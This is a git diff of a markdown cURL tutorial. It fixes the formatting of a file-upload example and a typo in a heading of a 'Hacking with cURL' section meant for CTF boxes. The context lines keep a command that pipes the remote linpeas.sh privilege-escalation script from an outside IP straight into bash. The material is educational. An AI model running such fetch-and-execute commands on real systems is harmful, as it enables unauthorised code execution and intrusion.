@@ -165,13 +165,14 @@ curl https://httpbin.org/status/302  -w "%{response_code} %{redirect_url}" -s -o
 
 The proper way to upload files with CURL is to use **-F ( — form)** option, which will add **enctype=”multipart/form-data”** to the request.
 
-``$ curl -F ‘data=@path/to/local/file’ UPLOAD_ADDRESS`
-
+```bash
+curl -F ‘data=@path/to/local/file’ UPLOAD_ADDRESS`
+```
 
 ## Hacking with cURL
 Now that we have covered the basic syntax and use cases, here are some practical hacking applications that are very helpful on Hackthebox or CTF boxes.
 
-#### Using cURL to pipe a remote scipt (linpeas.sh) directly to bash:
+#### Using cURL to pipe a remote script (linpeas.sh) directly to bash:
 ```Bash
 $ curl -sSk "http://10.10.10.10/linpeas.sh" | bash
 ```
